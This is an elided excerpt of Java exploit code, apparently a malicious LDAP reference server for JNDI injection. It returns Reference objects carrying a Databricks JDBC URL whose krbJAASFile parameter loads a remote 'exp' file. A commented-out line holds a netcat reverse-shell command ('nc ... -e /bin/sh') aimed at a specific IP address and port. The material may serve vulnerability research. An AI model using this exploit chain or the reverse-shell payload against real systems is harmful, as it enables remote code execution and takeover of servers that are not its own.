...
public class LdapRefServer0 implements Runnable{

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {
        new LdapRefServer0().run();
    }
...
//                    "CALL EXEC ('nc 111.229.158.40 2345 -e /bin/sh')\\;";
            ...
            ref.add(new StringRefAddr("driverClassName", "com.databricks.client.jdbc.Driver"));
            ref.add(new StringRefAddr("jdbcUrl", "jdbc:databricks://127.0.0.1:443;AuthMech=1;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=http://127.0.0.1:8078/exp"));
